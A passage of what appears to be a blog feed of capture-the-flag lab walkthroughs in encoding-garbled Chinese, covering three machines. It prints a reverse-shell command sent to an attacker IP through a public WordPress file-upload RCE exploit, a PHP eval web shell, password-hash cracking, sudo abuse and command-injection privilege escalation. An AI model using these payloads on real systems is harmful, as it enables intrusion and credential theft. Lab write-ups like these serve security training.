ÊàêÂäüÁôªÂΩïÂà∞ `lemon` Áî®Êà∑ÁöÑÊ°åÈù¢ÁéØÂ¢É„ÄÇÊàë‰ª¨Âú®Ê≠§ÁéØÂ¢É‰∏ãÂèçÂºπ‰∏Ä‰∏™Êñ∞ÁöÑShellÂà∞ÊîªÂáªÊú∫Ôºå‰ª•‰æøÂêéÁª≠Êìç‰ΩúÔºåÂπ∂ÊàêÂäüËØªÂèñÂà∞Á¨¨‰∏Ä‰∏™Flag„ÄÇ

```bash
lemon@Rrrdesk:~$ cat user.txt 
flag{user-9ffbf43126e33be52cd2bf7e01d627f9}
```

## **2. ÊèêÊùÉËá≥root (lemon -&gt; root)**

Âú® `lemon` Áî®Êà∑ÁöÑShell‰∏≠ÔºåÊâßË°å `sudo -l` Êù•Ê£ÄÊü•ÂÖ∂ `sudo` ÊùÉÈôê„ÄÇ

```bash
lemon@Rrrdesk:~$ sudo -l
...
User lemon may run the following commands on Rrrdesk:
    (ALL) NOPASSWD: /usr/bin/flite
```

ÁªìÊûúÊòæÁ§∫Ôºå`lemon` Áî®Êà∑ÂèØ‰ª•Êó†ÈúÄÂØÜÁ†Å‰ª•rootÊùÉÈôêÊâßË°å `/usr/bin/flite`„ÄÇ`flite` ÊòØ‰∏Ä‰∏™ÊñáÊú¨Âà∞ËØ≠Èü≥ÁöÑÂêàÊàêÂô®„ÄÇÈÄöËøáÊµãËØïÔºåÊàë‰ª¨ÂèëÁé∞ `flite` ÁöÑ `-add_lex` ÂèÇÊï∞ÂèØ‰ª•Ë¢´Áî®Êù•ËØªÂèñÊñá‰ª∂„ÄÇÂΩìÂÆÉÂ∞ùËØïËØªÂèñ‰∏Ä‰∏™ÈùûÊ†áÂáÜÊ†ºÂºèÁöÑËØçÂÖ∏Êñá‰ª∂Êó∂Ôºå‰ºöÊä•ÈîôÂπ∂ÊòæÁ§∫Êñá‰ª∂ÁöÑÂÜÖÂÆπ„ÄÇ

Êàë‰ª¨ÂèØ‰ª•Âà©Áî®Ê≠§ÁâπÊÄßÊù•ËØªÂèñ `/root` ÁõÆÂΩï‰∏ãÁöÑ `root.txt` Êñá‰ª∂„ÄÇ

```bash
lemon@Rrrdesk:~$ sudo /usr/bin/flite -add_lex /root/root.txt
add_addenda: lex cmu: expected ':' in flag{root-68b329da9893e34099c7d8ad5cb9c940}
```

ÂëΩ‰ª§ÁöÑÊä•Èîô‰ø°ÊÅØÊàêÂäüÊ≥ÑÈú≤‰∫Ü `root.txt` ÁöÑÂÜÖÂÆπ„ÄÇ

# **Âõõ„ÄÅËé∑ÂèñFlag**

Êàë‰ª¨Â∑≤ÁªèÊàêÂäüËé∑Âèñ‰∫ÜÁ≥ªÁªü‰∏äÁöÑÊâÄÊúâFlag„ÄÇ

* **User Flag:**

  ```bash
  lemon@Rrrdesk:~$ cat /home/lemon/user.txt
  flag{user-9ffbf43126e33be52cd2bf7e01d627f9}
  ```

* **Root Flag:**

  ```
  flag{root-68b329da9893e34099c7d8ad5cb9c940}
  ```

Ê∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Rrrdesk.html</guid><pubDate>Mon, 11 Aug 2025 14:11:58 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Plugin</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Plugin.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞**

È¶ñÂÖàÔºå‰ΩøÁî® `arp-scan` Âú® `192.168.205.0/24` ÁΩëÊÆµ‰∏≠Êâ´ÊèèÂ≠òÊ¥ª‰∏ªÊú∫ÔºåÁ°ÆÂÆöÁõÆÊ†á„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.131 08:00:27:5f:2c:34       PCS Systemtechnik GmbH
...
```

ÂëΩ‰ª§ËæìÂá∫Á°ÆËÆ§‰∫ÜÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ‰∏∫ `192.168.205.131`„ÄÇ

## **2. Á´ØÂè£Êâ´Êèè**

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂØπÂ§ñÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.131
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

Êâ´ÊèèÁªìÊûúË°®ÊòéÔºåÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæ‰∫Ü **22 (SSH)** Âíå **80 (HTTP)** Á´ØÂè£„ÄÇWebÊúçÂä°ÊòØ‰∏ªË¶ÅÁöÑÊîªÂáªÂÖ•Âè£„ÄÇ

## **3. Web‰ø°ÊÅØÊé¢Êµã**

ËÆøÈóÆ `http://192.168.205.131` ÊòØ‰∏Ä‰∏™ Apache ÁöÑÈªòËÆ§È°µÈù¢„ÄÇ‰ΩøÁî® `gobuster` ËøõË°åÁõÆÂΩïÁàÜÁ†¥ÔºåÂèëÁé∞‰∫ÜÂ§ö‰∏™PHPÈ°µÈù¢„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.131 -w ... -x php,txt,html
...
/index.php            (Status: 302) [Size: 0] [--&gt; home.php]
/home.php             (Status: 200) [Size: 1954]
/about.php            (Status: 200) [Size: 1286]
/feedback.php         (Status: 200) [Size: 2189]
...
```

Âú®ÊµèËßàÂèëÁé∞ÁöÑÈ°µÈù¢Êó∂Ôºå`feedback.php` ÁöÑÊèê‰∫§ÂäüËÉΩÂºπÁ™óÊ≥ÑÈú≤‰∫Ü‰∏Ä‰∏™ÂÖ≥ÈîÆ‰ø°ÊÅØÔºö`ÂèçÈ¶àÂ∑≤Êèê‰∫§ÔºÅÊúçÂä°Á´ØÂ§ÑÁêÜ‰ΩøÁî®ÂüüÂêç: plugin.dsz`„ÄÇÊàë‰ª¨Â∞ÜÊ≠§ÂüüÂêçÊ∑ªÂä†Âà∞Êú¨Âú∞ `/etc/hosts` Êñá‰ª∂‰∏≠„ÄÇ

ÈÖçÁΩÆÂ•Ω `hosts` ÂêéÔºå‰ΩøÁî® `nuclei` ÂØπ `http://plugin.dsz` ËøõË°åËá™Âä®ÂåñÊºèÊ¥ûÊâ´ÊèèÔºåÂèëÁé∞‰∏Ä‰∏™‰∏•ÈáçÊºèÊ¥û„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nuclei -u http://plugin.dsz
...
[CVE-2025-34085] [http] [critical] http://plugin.dsz/wp-content/uploads/simple-file-list/aighbdh.php
[wordpress-rce-simplefilelist] [http] [critical] http://plugin.dsz/wp-content/uploads/simple-file-list/egafhad.php
...
```

Êâ´ÊèèÁªìÊûúÁõ¥Êåá **WordPress** ÁöÑ **Simple File List** Êèí‰ª∂Â≠òÂú®ËøúÁ®ã‰ª£Á†ÅÊâßË°åÔºàRCEÔºâÊºèÊ¥û (CVE-2025-34085)„ÄÇ

# **‰∫å„ÄÅWebÊ∏óÈÄè‰∏éÁ´ãË∂≥ÁÇπ**

## **1. RCEÊºèÊ¥ûÂà©Áî®**

Ê†πÊçÆ `nuclei` ÁöÑÊâ´ÊèèÁªìÊûúÔºåÊàë‰ª¨ÊâæÂà∞‰∫ÜÈíàÂØπ `CVE-2025-34085` ÁöÑÂÖ¨ÂºÄÊºèÊ¥ûÂà©Áî®ËÑöÊú¨„ÄÇ ËØ•ÊºèÊ¥ûÂÖÅËÆ∏Êú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑÊîªÂáªËÄÖ‰∏ä‰º†‰∏Ä‰∏™‰º™Ë£ÖÊàêÂõæÁâáÁöÑÊñá‰ª∂ÔºåÁÑ∂ÂêéÂ∞ÜÂÖ∂ÈáçÂëΩÂêç‰∏∫ `.php` Êñá‰ª∂Ôºå‰ªéËÄåÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ

È¶ñÂÖàÔºå‰ΩøÁî®ÊºèÊ¥ûÂà©Áî®ËÑöÊú¨ÊâßË°å `id` ÂëΩ‰ª§ÔºåÈ™åËØÅÊºèÊ¥ûÊòØÂê¶Â≠òÂú®‰∏îÂèØÂà©Áî®„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CVE-2025-34085]
‚îî‚îÄ$ python3 CVE-2025-34085.py -u http://plugin.dsz --cmd 'id'
...
[DEBUG] Command Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] http://plugin.dsz | http://plugin.dsz/wp-content/uploads/simple-file-list/cttlu7x9.php
```

ÂëΩ‰ª§ÊàêÂäüËøîÂõû `www-data` Áî®Êà∑‰ø°ÊÅØÔºåÁ°ÆËÆ§RCEÊºèÊ¥ûÂèØ‰ª•Âà©Áî®„ÄÇ

## **2. Getshell**

Êé•‰∏ãÊù•ÔºåÂà©Áî®ËØ•ÊºèÊ¥ûËé∑Âæó‰∏Ä‰∏™ÂèçÂºπshell„ÄÇÈ¶ñÂÖàÂú®ÊîªÂáªÊú∫‰∏äËÆæÁΩÆ `netcat` ÁõëÂê¨ `8888` Á´ØÂè£„ÄÇ

ÁÑ∂ÂêéÔºåÊâßË°å‰ª•‰∏ãÂëΩ‰ª§ÔºåËÆ©ÁõÆÊ†á‰∏ªÊú∫ÂèçÂºπ‰∏Ä‰∏™ `/bin/bash` shell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CVE-2025-34085]
‚îî‚îÄ$ python3 CVE-2025-34085.py -u http://plugin.dsz --cmd 'busybox nc 192.168.205.128 8888 -e /bin/bash'
```

ÊîªÂáªÊú∫ÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπshellÔºåËé∑Âæó‰∫Ü `www-data` Áî®Êà∑ÁöÑËÆøÈóÆÊùÉÈôê„ÄÇ

---

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **1. Ê®™ÂêëÁßªÂä® (www-data -&gt; yi)**

Âú® `www-data` shell‰∏≠ÔºåÊàë‰ª¨È¶ñÂÖàÂØªÊâæÊï∞ÊçÆÂ∫ìÈÖçÁΩÆÊñá‰ª∂„ÄÇÂú®WebÊ†πÁõÆÂΩï `/var/www/plugin.dsz/` ‰∏≠ÔºåÊâæÂà∞‰∫Ü `wp-config.php` Êñá‰ª∂„ÄÇ

```bash
www-data@Plugin:/var/www/plugin.dsz$ cat wp-config.php
...
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'password' );
...
```

Âà©Áî®Ê≥ÑÈú≤ÁöÑÊï∞ÊçÆÂ∫ìÂá≠ÊçÆËøûÊé•Âà∞Êú¨Âú∞MariaDBÊï∞ÊçÆÂ∫ìÔºåÂπ∂Êü•ËØ¢ `wp_users` Ë°®„ÄÇ

```sql
MariaDB [wordpress]&gt; select * from wp_users;
+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+
| ID | user_login | user_pass                          | user_nicename | ... | user_activation_key | display_name |
+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+
|  1 | root       | $wp$2y$10$...                       | root          | ... |                     | root         |
|  2 | yi         | b00b6ce41fbb3854fbfddcb71b5aa15d     | yi            | ... | eWl5aXlp            | eWl5aXlp     |
+----+------------+------------------------------------+---------------+ ... +---------------------+--------------+
```

Êàë‰ª¨ÂèëÁé∞‰∫Ü‰∏§‰∏™Áî®Êà∑Ôºö`root` Âíå `yi`„ÄÇÂú® `yi` Áî®Êà∑ÁöÑÊï∞ÊçÆË°å‰∏≠Ôºå`user_activation_key` Âíå `display_name` Â≠óÊÆµÁöÑÂÄºÂùá‰∏∫ `eWl5aXlp`„ÄÇÁåúÊµãËøô‰∏∫`yi`Áî®Êà∑ÂØÜÁ†Å„ÄÇ

‰ΩøÁî® `su yi` ÂíåÂØÜÁ†Å `eWl5aXlp`ÔºåÊàêÂäüÂàáÊç¢Âà∞ `yi` Áî®Êà∑„ÄÇ

## **2. ÊèêÊùÉËá≥root (yi -&gt; root)**

ÂàáÊç¢Âà∞ `yi` Áî®Êà∑ÂêéÔºåÊâßË°å `sudo -l` Êù•Ê£ÄÊü•ÂÖ∂ `sudo` ÊùÉÈôê„ÄÇ

```bash
yi@Plugin:~$ sudo -l
...
User yi may run the following commands on Plugin:
    (ALL) NOPASSWD: /bin/bash /home/yi/yiyi.sh
```

ÁªìÊûúÊòæÁ§∫Ôºå`yi` Áî®Êà∑ÂèØ‰ª•Êó†ÈúÄÂØÜÁ†Å‰ª•rootÊùÉÈôêÊâßË°å `/home/yi/yiyi.sh` ËÑöÊú¨„ÄÇÁî±‰∫é `yi` Áî®Êà∑ÂØπÂÖ∂ÂÆ∂ÁõÆÂΩïÊúâÂÜôÊùÉÈôêÔºåÊàë‰ª¨ÂèØ‰ª•ËΩªÊòìÂú∞ÊõøÊç¢ÊéâËøô‰∏™ËÑöÊú¨„ÄÇ

**ÊèêÊùÉÊ≠•È™§**:

1. Â§á‰ªΩÂπ∂ÊõøÊç¢ÂéüÂßãËÑöÊú¨ÔºåÂÜôÂÖ•‰∏Ä‰∏™ÂèØ‰ª•‰∏∫ `/bin/bash` Ê∑ªÂä†SUIDÊùÉÈôêÁöÑÂëΩ‰ª§„ÄÇ

   ```bash
   yi@Plugin:~$ mv /home/yi/yiyi.sh /home/yi/1
   yi@Plugin:~$ echo 'chmod +s /bin/bash' &gt; /home/yi/yiyi.sh
   ```

2. ‰ª• `sudo` ÊùÉÈôêÊâßË°åË¢´ÁØ°ÊîπÂêéÁöÑËÑöÊú¨„ÄÇ

   ```bash
   yi@Plugin:~$ sudo /bin/bash /home/yi/yiyi.sh
   ```

3. ÊâßË°å `bash -p`„ÄÇ`-p` ÂèÇÊï∞‰ΩøÂæó `bash` Âú®ÂêØÂä®Êó∂‰∏ç‰ºöÊîæÂºÉrootÊùÉÈôêÔºå‰ªéËÄåËé∑Âæó‰∏Ä‰∏™ÊúâÊïàÁöÑroot shell„ÄÇ

   ```bash
   yi@Plugin:~$ bash -p
   bash-5.0# id
   uid=1000(yi) gid=1000(yi) euid=0(root) egid=0(root) groups=0(root),1000(yi)
   ```

   `id` ÂëΩ‰ª§ÁöÑËæìÂá∫Á°ÆËÆ§Êàë‰ª¨Â∑≤ÊàêÂäüËé∑ÂæórootÊùÉÈôê„ÄÇ

---

# **Âõõ„ÄÅËé∑ÂèñFlag**

Áé∞Âú®Êàë‰ª¨Êã•Êúâ‰∫ÜrootÊùÉÈôêÔºåÂèØ‰ª•ËØªÂèñÁ≥ªÁªü‰∏äÁöÑÊâÄÊúâÊïèÊÑüÊñá‰ª∂„ÄÇ

```bash
bash-5.0# cat /home/yi/user.txt
flag{user-058e8f474511327e5aeed4efa793033a}

bash-5.0# cat /root/root.txt
flag{root-ab9d82b9ae7d7d7256a95efe3447ec78}
```

ÊâÄÊúâFlagÂùáÂ∑≤ÊâæÂà∞ÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Plugin.html</guid><pubDate>Mon, 11 Aug 2025 03:48:44 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_hoshi</title><link>https://7r1UMPHK.github.io/post/nei-bu-_hoshi.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºå‰ΩøÁî® `arp-scan` Âú® `192.168.205.0/24` ÁΩëÊÆµ‰∏≠ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.142 08:00:27:24:64:43       PCS Systemtechnik GmbH
...
```

Á°ÆËÆ§ÁõÆÊ†á‰∏ªÊú∫IPÂú∞ÂùÄ‰∏∫ `192.168.205.142`„ÄÇ

## 2. Á´ØÂè£Êâ´Êèè

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.142
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÂºÄÊîæ‰∫Ü **22 (SSH)** Âíå **80 (HTTP)** ‰∏§‰∏™Á´ØÂè£„ÄÇÊàë‰ª¨Â∞ÜWebÊúçÂä°‰Ωú‰∏∫‰∏ªË¶ÅÁöÑÊîªÂáªÂÖ•Âè£„ÄÇ

## 3. WebÁõÆÂΩï‰∏éÊñá‰ª∂ÂèëÁé∞

ËÆøÈóÆ `http://192.168.205.142` ÊòØ‰∏Ä‰∏™‚ÄúÊòüÈôÖÂïÜÂüé‚ÄùÁöÑÂïÜÂìÅÂèçÈ¶àÈ°µÈù¢„ÄÇ‰ΩøÁî® `dirsearch` ËøõË°åÁõÆÂΩïÁàÜÁ†¥ÔºåÂèëÁé∞Â§ö‰∏™ÂÖ≥ÈîÆÊñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ dirsearch -u http://192.168.205.142
...
[09:26:07] 200 -    1KB - /admin.php
[09:26:16] 200 -   23KB - /info.php
[09:26:22] 200 -  109B  - /robots.txt
[09:26:25] 301 -  320B  - /uploads  -&gt;  http://192.168.205.142/uploads/
...
```

‰∏ªË¶ÅÂèëÁé∞Ôºö

*   `/admin.php`: ÂêéÂè∞ÁôªÂΩïÈ°µÈù¢„ÄÇ
*   `/info.php`: ‰∏Ä‰∏™ `phpinfo()` È°µÈù¢ÔºåÊ≥ÑÈú≤‰∫ÜËØ¶ÁªÜÁöÑPHPÈÖçÁΩÆ„ÄÇ
*   `/uploads/`: ‰∏Ä‰∏™ÂºÄÊîæÁõÆÂΩïÊµèËßàÁöÑ‰∏ä‰º†ÁõÆÂΩï„ÄÇ
*   `/robots.txt`: Â≠òÂú®ÊúâË∂£ÁöÑ‰ø°ÊÅØ„ÄÇ

## 4. ‰ø°ÊÅØÊ≥ÑÈú≤

Êü•Áúã `robots.txt` Êñá‰ª∂ÂÜÖÂÆπÔºåÂèëÁé∞‰∏ÄÊù°ÈáçË¶ÅÁ∫øÁ¥¢„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.142/robots.txt
Êú¨Á´ôÁöÑ logo ÁÅµÊÑüÊù•Ëá™ https://maze-sec.com/special/1/Ôºå‰ΩÜÊàë‰ª¨ÁªôÂÆÉÊ∑ª‰∫ÜÁÇπÁâπÂà´ÁöÑ‚ÄòÂë≥ÈÅì‚ÄôÔºÅ
```

ËØ•Á∫øÁ¥¢ÊöóÁ§∫ÁΩëÁ´ôÁöÑlogoÂõæÁâá `QQ.png` ÂèØËÉΩË¢´‰øÆÊîπËøáÔºåÂê´ÊúâÈöêËóè‰ø°ÊÅØ„ÄÇ

# ‰∫å„ÄÅWebÊ∏óÈÄè‰∏éÁ´ãË∂≥ÁÇπ

## 1. ÂêéÂè∞ÁôªÂΩï

ËÆøÈóÆ `/admin.php` ÊòØ‰∏Ä‰∏™ÁÆ°ÁêÜÂëòÁôªÂΩïÈ°µÈù¢ÔºåÂè™ÈúÄË¶ÅËæìÂÖ•ÂØÜÁ†Å„ÄÇÊ†πÊçÆ‰∏ªÈ°µÈ°µËÑöÁöÑÂÆ¢ÊúçÁÉ≠Á∫ø `400-123-4567`ÔºåÂ∞ùËØï‰ª•Ê≠§‰Ωú‰∏∫ÂØÜÁ†ÅËøõË°åÁôªÂΩïÔºåÊàêÂäüËøõÂÖ•ÂêéÂè∞„ÄÇ

## 2. ÂõæÂÉèÈöêÂÜô (Áõ≤Ê∞¥Âç∞)

Ê†πÊçÆ `robots.txt` ÁöÑÊèêÁ§∫ÔºåÊàë‰ª¨ÊÄÄÁñëlogoÂõæÁâáÂ≠òÂú®ÈöêÂÜô„ÄÇ

1. ÂàÜÂà´‰∏ãËΩΩÁõÆÊ†áÁΩëÁ´ôÁöÑlogoÂíåÂéüÂßãlogo„ÄÇ

   ```bash
   wget http://192.168.205.142/QQ.png -O target_logo.png
   wget https://maze-sec.com/img/QQ.png -O original_logo.png
   ```

2. Â∏∏ËßÑÁöÑÈöêÂÜôÂàÜÊûêÂ∑•ÂÖ∑ÂùáÊú™ÂèëÁé∞ÂºÇÂ∏∏„ÄÇËÄÉËôëÂà∞‚ÄúÂë≥ÈÅì‚ÄùËøôÁßçÊèèËø∞ÔºåÊé®ÊµãÂèØËÉΩÊòØÁõ≤Ê∞¥Âç∞ÔºàBlind WatermarkÔºâ„ÄÇ

3. ‰ΩøÁî®Áõ≤Ê∞¥Âç∞Â∑•ÂÖ∑ËøõË°åËß£ÂØÜÔºåÊàêÂäüÊèêÂèñÂá∫ÈöêËóèÁöÑÊ∞¥Âç∞‰ø°ÊÅØ„ÄÇ

   ```bash
   # ÂÖãÈöÜÂ∑•ÂÖ∑
   git clone https://github.com/chishaxie/BlindWaterMark.git
   cd BlindWaterMark
   
   # Ëß£Á†Å
   python bwmforpy3.py decode target_logo.png original_logo.png wm_extracted.png
   ```

4. Êü•ÁúãÊèêÂèñÂá∫ÁöÑÊ∞¥Âç∞ÂõæÁâá `wm_extracted.png`ÔºåÂæóÂà∞ÈöêËóèÁöÑÁõÆÂΩïË∑ØÂæÑÔºö`/hoshi/`„ÄÇ

![ÊèêÂèñÂá∫ÁöÑÊ∞¥Âç∞](http://7r1UMPHK.github.io/image/20250810220719846.webp)

## 3. Êñá‰ª∂ÂåÖÂê´‰∏éGetshell

1. ËÆøÈóÆÊñ∞ÂèëÁé∞ÁöÑË∑ØÂæÑ `http://192.168.205.142/hoshi/`ÔºåÂèëÁé∞‰∏Ä‰∏™Êñá‰ª∂ `gift.php`„ÄÇÁõ¥Êé•ËÆøÈóÆËØ•Êñá‰ª∂ËøîÂõûÈîôËØØ‚ÄúÈùûÊ≥ïÊñá‰ª∂Âêç‚ÄùÔºåËøôÊòØÂÖ∏ÂûãÁöÑÊñá‰ª∂ÂåÖÂê´ÔºàLFIÔºâÊºèÊ¥ûÁâπÂæÅ„ÄÇ

2. ÈÄöËøáFuzzÂ∑•ÂÖ∑ `ffuf` ÁàÜÁ†¥ÂèÇÊï∞ÔºåÁ°ÆÂÆöÁî®‰∫éÊñá‰ª∂ÂåÖÂê´ÁöÑÂèÇÊï∞‰∏∫ `file`„ÄÇ

3. Âú® `admin.php` È°µÈù¢Ê∫êÁ†Å‰∏≠ÔºåÂèëÁé∞‰∏ÄË°åÈöêËóèÁöÑÊ≥®ÈáäÔºö`&lt;div style='display:none' id='static-tip'&gt;[debug] ÈùôÊÄÅÈ°µÈù¢Â∑≤ÁîüÊàê&lt;/div&gt;`„ÄÇ

4. **ÊîªÂáªÈìæÊ¢≥ÁêÜ**Ôºö

   *   Âú®‰∏ªÈ°µ `/index.php` ÁöÑÂèçÈ¶àË°®Âçï‰∏≠Êèê‰∫§PHP Web Shell„ÄÇ
   *   ÁôªÂΩïÂêéÂè∞ `/admin.php`„ÄÇËøô‰∏™ÁôªÂΩïË°å‰∏∫‰ºöËß¶ÂèëÊúçÂä°Âô®Â∞ÜÂú®ÂêéÂè∞ÁîüÊàê‰∏Ä‰∏™ÂåÖÂê´ÊâÄÊúâÂèçÈ¶àÂÜÖÂÆπÁöÑÈùôÊÄÅÊñá‰ª∂ `admin.html`„ÄÇÔºàÈÄöËøáÁõÆÂΩïÁàÜÁ†¥ÂèëÁé∞Ôºâ
   *   Âà©Áî® `gift.php` ÁöÑÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÂéªËØªÂèñËøô‰∏™Êñ∞ÁîüÊàêÁöÑ `admin.html`„ÄÇÁî±‰∫éËØ•Êñá‰ª∂ÊòØË¢´PHPÂºïÊìéÂåÖÂê´ÁöÑÔºåÂÖ∂‰∏≠ÁöÑPHP‰ª£Á†ÅÂ∞Ü‰ºöË¢´ÊâßË°å„ÄÇ

5. **Êìç‰ΩúÊ≠•È™§**:

   * **Ê≠•È™§‰∏ÄÔºöÊ≥®ÂÖ•Payload**„ÄÇÂú®‰∏ªÈ°µÁöÑÂèçÈ¶àË°®Âçï‰∏≠ÁöÑ'ÊÇ®ÁöÑÊòµÁß∞'ËæìÂÖ•Ê†èÊèê‰∫§‰ª•‰∏ãÂÜÖÂÆπ„ÄÇ

     ```php
     &lt;?php eval($_POST['ant']); ?&gt;
     ```

   * **Ê≠•È™§‰∫åÔºöËß¶ÂèëÁîüÊàê**„ÄÇËÆøÈóÆ `/admin.php` Âπ∂‰ΩøÁî®ÂØÜÁ†Å `400-123-4567` ÁôªÂΩï„ÄÇÊ≠§Êó∂ÔºåÂåÖÂê´Êàë‰ª¨PayloadÁöÑ `admin.html` Êñá‰ª∂Â∑≤ÁªèÂú®WebÊ†πÁõÆÂΩïÁîüÊàê„ÄÇ

   * **Ê≠•È™§‰∏âÔºöÊûÑÈÄ†LFI URL**„ÄÇ`http://192.168.205.142/hoshi/gift.php?file=admin.html`

   * **Ê≠•È™§ÂõõÔºöËøûÊé•Shell**„ÄÇ‰ΩøÁî®ËöÅÂâëÔºàAntSwordÔºâËøûÊé•‰∏äËø∞URLÔºåÂØÜÁ†Å‰∏∫ `ant`ÔºåÊàêÂäüËé∑Âæó `www-data` Áî®Êà∑ÁöÑWeb Shell„ÄÇ

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. Ê®™ÂêëÁßªÂä® (www-data -&gt; welcome)

1. Âú® `www-data` shell‰∏≠Ôºå‰ΩøÁî® `linpeas.sh` Á≠âËÑöÊú¨ËøõË°å‰ø°ÊÅØÊî∂ÈõÜ„ÄÇÂú® `/var/backups/` ÁõÆÂΩï‰∏ãÂèëÁé∞‰∏Ä‰∏™ÂèØËØªÁöÑÊïèÊÑüÊñá‰ª∂ `shadow~`„ÄÇ

2. ËØªÂèñËØ•Êñá‰ª∂ÔºåËé∑Âæó `root` Âíå `welcome` Áî®Êà∑ÁöÑÂØÜÁ†ÅÂìàÂ∏å„ÄÇ

3. ‰ΩøÁî® `John the Ripper` Âíå `rockyou.txt` Â≠óÂÖ∏ÂØπÂìàÂ∏åËøõË°åÁ†¥Ëß£ÔºåÂæóÂà∞ `welcome` Áî®Êà∑ÁöÑÂØÜÁ†Å‰∏∫ `loveme2`„ÄÇ

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ john --wordlist=rockyou.txt hash.txt
   ...
   loveme2          (welcome)     
   ...
   ```

4. ‰ΩøÁî® `su` ÂëΩ‰ª§ÂíåÁ†¥Ëß£Âá∫ÁöÑÂØÜÁ†ÅÊàêÂäüÂàáÊç¢Âà∞ `welcome` Áî®Êà∑„ÄÇ

## 2. ÊèêÊùÉËá≥root (welcome -&gt; root)

1. Âú® `welcome` Áî®Êà∑‰∏ãÔºå‰ΩøÁî® `sudo -l` Ê£ÄÊü•ÂÖ∂sudoÊùÉÈôêÔºåÂèëÁé∞ÂèØ‰ª•Êó†ÂØÜÁ†Å‰ª•rootÊùÉÈôêÊâßË°å‰∏Ä‰∏™PythonËÑöÊú¨ `/root/12345.py`„ÄÇ

   ```bash
   welcome@hoshi:/tmp$ sudo -l
   ...
   User welcome may run the following commands on hoshi:
       (ALL) NOPASSWD: /usr/bin/python3 /root/12345.py
   ```

2. ÊâßË°åËØ•ËÑöÊú¨ÔºåÂÆÉ‰ºöÂú® `12345` Á´ØÂè£‰∏äÂºÄÂêØ‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑÈÖçÁΩÆshell„ÄÇ

3. Âú®KaliÊîªÂáªÊú∫‰∏äÔºå‰ΩøÁî® `ncat` ËøûÊé•ËØ•ÊúçÂä°„ÄÇÈÄöËøá `help` ÂëΩ‰ª§ÂèëÁé∞ `exec_cmd` Êåá‰ª§„ÄÇÊµãËØïÂèëÁé∞ `|;&amp;&lt;&gt;` Á≠âÂ≠óÁ¨¶Ë¢´ËøáÊª§Ôºå‰ΩÜ `&amp;&amp;` ÂèØÁî®‰∫éÂëΩ‰ª§ÊãºÊé•„ÄÇ

4. Âà©Áî®ÂëΩ‰ª§Ê≥®ÂÖ•Ôºå‰∏∫ `/bin/bash` Ê∑ªÂä†SUIDÊùÉÈôê„ÄÇ

   ```bash
   conf&gt; exec_cmd id'&amp;&amp;chmod +s /bin/bash&amp;&amp;'
   uid=0(root) gid=0(root) groups=0(root)
   ```

5. ÂõûÂà∞Èù∂Êú∫shellÔºåÊâßË°å `bash -p`ÔºåÊàêÂäüËé∑ÂæórootÊùÉÈôêÁöÑshell„ÄÇ

   ```bash
   welcome@hoshi:/opt$ bash -p
   bash-5.0# id
   uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)
   ```

# Âõõ„ÄÅËé∑ÂèñFlag

